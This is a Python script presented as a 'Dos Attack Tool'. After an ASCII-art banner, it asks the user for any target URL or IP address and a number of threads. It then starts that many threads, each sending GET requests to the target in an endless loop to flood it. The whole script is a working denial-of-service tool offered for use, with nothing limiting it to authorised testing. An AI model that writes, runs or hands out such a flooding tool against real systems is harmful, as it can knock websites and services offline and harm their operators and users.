import threading
import requests
import sys
import time
import os

# ----------------------------
# Force all print statements to green
# ----------------------------
VERT = "\033[32m"
RESET = "\033[0m"

# Backup the original print function
original_print = print

# Redefine print to always include green color
def print(*args, **kwargs):
    original_print(VERT, end="")
    original_print(*args, **kwargs)
    original_print(RESET, end="\n")

    # 1. Le logo en texte ASCII généré (exemple)
logo_ascii = """
                                                 @@@@@@@@@@@@@@@@@@@                                 
                                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         
                                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                    
                                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                
                             @@@@@@@@@@@@@@@@@@                       @@@@@@@@@@@@@@@@@@             
                           @@@@@@@@@@@@@@                                   @@@@@@@@@@@@@@@          
                        @@@@@@@@@@@@@              @@@@@@@@@@@@@@@              @@@@@@@@@@@@@        
                       @@@@@@@@@@@          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@          @@@@@@@@@@@       
                       @@@@@@@@         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         @@@@@@@@       
                        @@@@@        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@        
                                  @@@@@@@@@@@@@@@                   @@@@@@@@@@@@@@@                  
                                @@@@@@@@@@@@@                           @@@@@@@@@@@@@                
                               @@@@@@@@@@            @@@@@@@@@@@            @@@@@@@@@@               
                                @@@@@@@         @@@@@@@@@@@@@@@@@@@@@         @@@@@@@                
                                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@                            
                                          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                         @@@@@@@@@@@             @@@@@@@@@@@                         
                                        @@@@@@@@@                   @@@@@@@@@                        
                                         @@@@@@        @@@@@@@        @@@@@@                         
                                                    @@@@@@@@@@@@@                                    
                                                   @@@@@@@@@@@@@@@                                   
                                                  @@@@@@@@@@@@@@@@@                                  
                                                  @@@@@@@@@@@@@@@@@                                  
                                                   @@@@@@@@@@@@@@@                                   
                                                    @@@@@@@@@@@@@                                    
                                                       @@@@@@@            

"""

# 2. Nettoyer l'écran avant l'affichage (optionnel, mais propre)
# 'cls' pour Windows, 'clear' pour Linux/macOS
os.system('cls' if os.name == 'nt' else 'clear')

# 3. Afficher le logo
print(logo_ascii)

# 4. Ajouter une petite pause avant le reste du script (optionnel)
time.sleep(2)

# Function to send HTTP requests
def attack(target):
    """
    Continuously sends GET requests to the specified target (URL or IP).
    """
    
    while True:
        try:
            # Setting a short timeout is good practice for testing
            response = requests.get(target, timeout=5) 
            status_code = response.status_code
            thread_id = threading.get_ident()
            
            # Print message without color
            print(f"Thread {thread_id} | Sent request | Status Code: {status_code}")

        except requests.exceptions.Timeout:
            # Print timeout error
            print(f"Thread {threading.get_ident()} | Error: Request timed out.")
        
        except requests.exceptions.RequestException as e:
            # Print connection errors
            print(f"Thread {threading.get_ident()} | Error: {e}")
        
        except Exception as e:
            # Print general unexpected errors
            print(f"Thread {threading.get_ident()} | Unexpected Error: {e}")


def main():
    print("--- Dos Attack Tool ---")
    
    # --- Get Target URL/IP ---
    while True:
        target_input = input("Please enter the target URL or IP: ").strip()
        
        if not target_input:
            print("Error: The target cannot be empty. Please try again.")
            continue
            
        # Check if the input is a simple IP address (no http/https)
        is_ip = '.' in target_input and not target_input.lower().startswith(('http', 'https'))
        
        # Format the target correctly
        if target_input.lower().startswith('http'):
            # Already a full URL
            target = target_input
        elif is_ip:
            # Assume it is an IP, prepend http:// to make it a valid requests URL
            target = "http://" + target_input
        else:
            # Assume it is a domain name without protocol, default to https
            print("Warning: Assuming domain name, defaulting to https...")
            target = "https://" + target_input.lstrip("/")
            
        print(f"Target set to: {target}")
        break
    
    # --- Get Number of Threads ---
    while True:
        num_threads_input = input("Please enter the number of threads: ").strip()
        try:
            num_threads = int(num_threads_input)
            if num_threads <= 0:
                print("Error: The number of threads must be a positive integer.")
            else:
                print(f"Using {num_threads} threads.")
                break
        except ValueError:
            print("Error: Invalid input. Please enter a whole number.")

    
    # --- Creating and Starting Threads ---
    print("\nStarting the Dos Attack")
    threads = []
    
    try:
        for i in range(num_threads):
            # Pass the target as an argument to the attack function
            thread = threading.Thread(target=attack, args=(target,))
            threads.append(thread)
            # Daemon threads exit automatically when the main program exits
            thread.daemon = True 
            thread.start()
        
        print(f"Successfully started {num_threads} threads. Requests are now being sent.")
        print("Press Ctrl+C to stop the execution.")
        
        # This loop keeps the main thread alive so the daemon threads can run
        for thread in threads:
            thread.join() 

    except KeyboardInterrupt:
        # Catch Ctrl+C to stop the program gracefully
        print("\n\nExecution interrupted by user (Ctrl+C). Shutting down...")
        sys.exit(0)
        
    except Exception as e:
        # --- MODIFIED BLOCK: Pause instead of immediate exit ---
        print("\n-------------------------------------------------------------")
        print(f"An unexpected error occurred during thread management: {e}")
        print("The program has been paused for inspection.")
        # The input() function blocks execution until the user presses Enter
        input("Press ENTER to close the program...")
        print("-------------------------------------------------------------")
        sys.exit(1)

if __name__ == "__main__":
    main()